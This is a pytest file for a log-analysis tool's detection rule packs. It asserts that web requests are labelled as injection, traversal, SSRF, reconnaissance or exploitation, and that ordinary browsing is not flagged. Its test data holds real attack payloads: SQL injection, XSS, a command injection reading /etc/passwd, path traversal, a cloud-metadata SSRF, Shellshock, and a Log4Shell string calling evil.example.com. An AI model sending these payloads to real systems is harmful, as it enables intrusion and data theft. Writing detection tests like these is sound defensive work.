"""Tests for the rule packs that ship with the tool.

These are the closest thing the project has to acceptance tests for detection:
each case is a payload seen in the wild, asserted to reach the right category.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

import pytest

from logarc.core.activity import ActivityCategory
from logarc.core.event import NormalizedEvent
from logarc.core.evidence import EvidenceRef
from logarc.detect.engine import RuleEngine
from logarc.detect.rulepacks import DEFAULT_RULEPACK_DIR, default_rules
from logarc.detect.rules import load_rules

START = datetime(2024, 5, 1, 12, 0, tzinfo=UTC)


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    return RuleEngine(default_rules())


def request(
    target: str,
    *,
    status: int = 200,
    user_agent: str | None = "Mozilla/5.0",
    seconds: float = 0,
    referer: str | None = None,
) -> NormalizedEvent:
    path, _, query = target.partition("?")
    return NormalizedEvent(
        timestamp=START + timedelta(seconds=seconds),
        client_ip="203.0.113.5",
        evidence=EvidenceRef("access.log", int(seconds) + 1),
        method="GET",
        path=path,
        query=query or None,
        status=status,
        bytes_sent=512,
        referer=referer,
        user_agent=user_agent,
    )


def test_the_bundled_packs_load() -> None:
    rules = default_rules()

    assert len(rules) > 20
    assert DEFAULT_RULEPACK_DIR.is_dir()


def test_every_bundled_rule_has_a_unique_id() -> None:
    ids = [rule.id for rule in default_rules()]

    assert len(ids) == len(set(ids))


def test_owasp_mappings_use_the_expected_notation() -> None:
    for rule in default_rules():
        if rule.owasp is not None:
            assert rule.owasp.startswith("A") and ":2021" in rule.owasp


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("/products?id=1 UNION SELECT username,password FROM users", ActivityCategory.INJECTION),
        ("/products?id=1' OR '1'='1", ActivityCategory.INJECTION),
        ("/p?id=1;SELECT pg_sleep(10)--", ActivityCategory.INJECTION),
        (
            "/p?id=1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
            ActivityCategory.INJECTION,
        ),
        ("/p?id=1; DROP TABLE users--", ActivityCategory.INJECTION),
        # Form encoding, as a browser and most attack tools send it: spaces
        # written as `+`. Found missing by the CSIC 2010 conversion.
        ("/p?id=1%27+OR+%271%27%3D%271", ActivityCategory.INJECTION),
        ("/p?q=1+UNION+SELECT+null%2Cnull--", ActivityCategory.INJECTION),
        # Error-based probing: the payload never returns rows, it provokes a
        # message that names the database. Found missing by the evaluation run.
        ("/p?id=1 AND 1=CONVERT(int,@@version)--", ActivityCategory.INJECTION),
        ("/p?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))", ActivityCategory.INJECTION),
        ("/p?id=1' AND 1=CAST((SELECT current_user) AS int)--", ActivityCategory.INJECTION),
        ("/p?id=1 AND UPDATEXML(1,CONCAT(0x7e,@@datadir),1)", ActivityCategory.INJECTION),
        ("/search?q=<script>alert(1)</script>", ActivityCategory.INJECTION),
        ("/p?next=javascript:alert(1)", ActivityCategory.INJECTION),
        ("/ping?host=127.0.0.1;cat /etc/passwd", ActivityCategory.PATH_TRAVERSAL),
        ('/api?filter={"$where":"1==1"}', ActivityCategory.INJECTION),
        ("/download?file=../../../../etc/passwd", ActivityCategory.PATH_TRAVERSAL),
        ("/download?file=..%2f..%2f..%2fetc%2fpasswd", ActivityCategory.PATH_TRAVERSAL),
        ("/.env", ActivityCategory.RECONNAISSANCE),
        ("/.git/config", ActivityCategory.RECONNAISSANCE),
        # Dependency manifests: how an attacker learns which versions are
        # installed before looking up what they are vulnerable to.
        ("/composer.json", ActivityCategory.RECONNAISSANCE),
        ("/package-lock.json", ActivityCategory.RECONNAISSANCE),
        ("/requirements.txt", ActivityCategory.RECONNAISSANCE),
        ("/backup.sql", ActivityCategory.RECONNAISSANCE),
        ("/phpinfo.php", ActivityCategory.RECONNAISSANCE),
        ("/fetch?url=http://169.254.169.254/latest/meta-data/", ActivityCategory.SSRF),
        ("/fetch?url=file:///etc/passwd", ActivityCategory.SSRF),
    ],
)
def test_known_payloads_reach_the_right_category(
    engine: RuleEngine, target: str, expected: ActivityCategory
) -> None:
    """Asserts the category is among the matches rather than that it won.

    A payload can honestly be two things at once — `file:///etc/passwd` in a
    parameter is both SSRF and an attempt to read a system file — and which one
    leads is a precedence decision, not a detection one. Pinning the primary
    label here would turn a taxonomy judgement into a test failure.
    """
    (labelled,) = engine.label_events([request(target)])

    matched = {label.category for label in labelled.all_labels}
    assert expected in matched, (
        f"{target!r} matched {[label.rule_id for label in labelled.all_labels] or 'nothing'}"
    )


def test_log4shell_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events(
        [request("/", user_agent="${jndi:ldap://evil.example.com/a}")]
    )

    assert labelled.label.rule_id == "log4shell_jndi"
    assert labelled.label.category is ActivityCategory.EXPLOITATION


def test_shellshock_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events(
        [request("/cgi-bin/x", user_agent="() { :; }; /bin/cat /etc/passwd")]
    )

    assert labelled.label.rule_id == "shellshock"


def test_a_scanner_announces_itself(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events([request("/", user_agent="sqlmap/1.7#stable")])

    assert labelled.label.rule_id == "scanner_user_agent"


def test_directory_enumeration_is_seen_across_requests(engine: RuleEngine) -> None:
    events = [request(f"/admin{n}", status=404, seconds=n) for n in range(25)]

    labelled = engine.label_events(events)

    assert any(item.label.rule_id == "directory_enumeration" for item in labelled)


def test_human_paced_directory_enumeration_is_detected(engine: RuleEngine) -> None:
    seconds = [0, 40, 80, 120, 160, 200, 240, 300]
    targets = [f"/quiet-probe-{n % 6}" for n in range(8)]
    events = [
        request(target, status=404, seconds=offset)
        for target, offset in zip(targets, seconds, strict=True)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in labelled)


@pytest.mark.parametrize(
    "targets",
    [
        [f"/probe-{n}" for n in range(7)],
        [f"/probe-{n % 5}" for n in range(8)],
    ],
)
def test_low_slow_enumeration_needs_eight_requests_and_six_paths(
    engine: RuleEngine, targets: list[str]
) -> None:
    events = [request(target, status=404, seconds=n * 40) for n, target in enumerate(targets)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration_low_slow" for item in labelled)


def test_low_slow_enumeration_does_not_count_refused_paths(engine: RuleEngine) -> None:
    events = [request(f"/private-{n}", status=403, seconds=n * 40) for n in range(8)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration_low_slow" for item in labelled)


def test_refused_paths_are_forced_browsing_rather_than_enumeration(engine: RuleEngine) -> None:
    """Two different behaviours, told apart by what the server answered.

    A wall of 404s is someone finding out what exists. A wall of 403s is
    someone being refused things that do exist. Enumeration used to claim both,
    so forced browsing — the more specific rule — could never win, and the
    access-control category never appeared in a graph at all.
    """
    # Enough requests, paths and speed that the enumeration rule would also
    # cover them if it still counted refusals as discovery.
    events = [request(f"/admin/{n}", status=403, seconds=n) for n in range(25)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "forced_browsing" for item in labelled)
    assert all(item.label.category is ActivityCategory.ACCESS_CONTROL for item in labelled)


def test_a_fast_page_load_is_not_reconnaissance(engine: RuleEngine) -> None:
    """A browser pulling one page's sub-resources is not a scan.

    Sixty asset fetches inside six seconds is what a single media-heavy page
    looks like over HTTP/2. `rapid_request_burst` keyed on rate alone and
    carried no `member` clause, so it labelled every request in the burst:
    427 static-asset lines of one measured corpus became reconnaissance, and
    not one of the 469 lines it won across that corpus was correct.
    """
    events = [request(f"/assets/img/{n}.png", seconds=n * 0.1) for n in range(60)]

    labelled = engine.label_events(events)

    assert all(item.label.category is ActivityCategory.STATIC_ASSET for item in labelled)


def test_a_page_whose_assets_are_all_missing_is_not_hostile(engine: RuleEngine) -> None:
    """A botched deploy is not an attacker.

    When a page requests sixty assets that are no longer there, every visitor
    produces sixty distinct 404s in six seconds. That clears
    `directory_enumeration`'s 20-in-60s and 15-distinct-paths thresholds, so
    each visitor is reported as enumerating the site.

    Recorded rather than left silent because it is the reason a `status >= 400`
    scope was rejected for the burst rule: keying on error responses fixes the
    healthy page and admits the broken one. The corpus this was measured on
    cannot show it — 41 of its 4,209 client errors are benign — so the case
    lives here instead.
    """
    events = [request(f"/assets/img/{n}.png", status=404, seconds=n * 0.1) for n in range(60)]

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


@pytest.mark.parametrize("referer", [None, "https://shop.example.com/catalog"])
def test_five_missing_pages_are_not_low_slow_enumeration(
    engine: RuleEngine, referer: str | None
) -> None:
    events = [
        request(f"/missing-page-{n}", status=404, seconds=n * 20, referer=referer) for n in range(5)
    ]

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


def test_one_asset_does_not_break_a_low_slow_window(engine: RuleEngine) -> None:
    events = [request(f"/probe-{n}", status=404, seconds=n * 30) for n in range(8)]
    events.insert(4, request("/missing.png", status=404, seconds=105))

    labelled = engine.label_events(events)

    probes = [item for item in labelled if not item.event.path.endswith(".png")]
    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in probes)


def test_later_assets_do_not_hide_an_earlier_high_volume_window(engine: RuleEngine) -> None:
    events = [request(f"/probe-{n}", status=404, seconds=n * 2) for n in range(20)]
    events.extend(request(f"/missing-{n}.png", status=404, seconds=40 + n * 2) for n in range(6))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[:20])
    assert "directory_enumeration" not in {label.rule_id for label in labelled[-1].all_labels}


def test_high_volume_window_recovers_after_an_asset_prefix(engine: RuleEngine) -> None:
    events = [request(f"/missing-{n}.png", status=404, seconds=n) for n in range(6)]
    events.extend(request(f"/probe-{n}", status=404, seconds=6 + n) for n in range(20))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[-20:])


def test_assets_around_a_high_volume_window_do_not_hide_it(engine: RuleEngine) -> None:
    events = [request(f"/before-{n}.png", status=404, seconds=n) for n in range(6)]
    events.extend(request(f"/probe-{n}", status=404, seconds=6 + n) for n in range(20))
    events.extend(request(f"/after-{n}.png", status=404, seconds=26 + n) for n in range(6))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[6:26])


def test_high_volume_enumeration_accepts_guard_thresholds(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}.png" if n < 4 else f"/probe-{n}",
            status=404,
            seconds=n * 3,
            referer="https://shop.example.com/catalog" if 4 <= n < 8 else None,
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    overlap = [
        item
        for item in labelled
        if {label.rule_id for label in item.all_labels}
        >= {"directory_enumeration", "directory_enumeration_low_slow"}
    ]
    assert overlap
    assert all(item.label.rule_id == "directory_enumeration" for item in overlap)


def test_high_volume_enumeration_rejects_too_many_static_assets(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}.png" if n < 5 else f"/probe-{n}",
            status=404,
            seconds=n * 3,
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration" for item in labelled)


def test_high_volume_enumeration_ignores_spoofed_referers(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}",
            status=404,
            seconds=n * 3,
            referer="https://shop.example.com/catalog",
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled)


def test_low_slow_enumeration_ignores_spoofed_referers(engine: RuleEngine) -> None:
    events = [
        request(
            f"/quiet-probe-{n}",
            status=404,
            seconds=n * 40,
            referer="https://shop.example.com/catalog",
        )
        for n in range(8)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in labelled)


def test_credential_attack_is_seen_across_requests(engine: RuleEngine) -> None:
    events = [request("/login", status=401, seconds=n * 2) for n in range(20)]

    labelled = engine.label_events(events)

    assert any(item.label.rule_id == "credential_attack" for item in labelled)


@pytest.mark.parametrize(
    "target",
    [
        "/",
        "/index.html",
        "/products/shoes",
        "/assets/app.css",
        "/images/logo.png",
        "/search?q=running+shoes",
        "/api/v1/products?page=2",
        "/blog/2024/05/a-post-about-unions",
        "/cart?add=17&quantity=2",
        # Words the error-based injection rule looks for, used innocently.
        "/api/convert?from=usd&to=eur",
        "/docs/version",
        "/api/v1/users/cast-members",
    ],
)
def test_ordinary_traffic_is_not_flagged_as_hostile(engine: RuleEngine, target: str) -> None:
    """False positives on normal browsing would bury the real findings."""
    (labelled,) = engine.label_events([request(target)])

    assert not labelled.label.category.is_hostile, (
        f"{target!r} was flagged as {labelled.label.rule_id!r}"
    )


def test_packs_can_be_extended_with_a_local_pack(tmp_path) -> None:  # type: ignore[no-untyped-def]
    """Investigators add their own detections without touching the code."""
    local = tmp_path / "local.yaml"
    local.write_text(
        """
version: 1
rules:
  - id: house_rule
    name: House Rule
    category: reconnaissance
    severity: low
    match:
      any:
        - field: path_decoded
          contains: '/honeypot'
""",
        encoding="utf-8",
    )

    engine = RuleEngine([*default_rules(), *load_rules([local])])
    (labelled,) = engine.label_events([request("/honeypot")])

    assert labelled.label.rule_id == "house_rule"
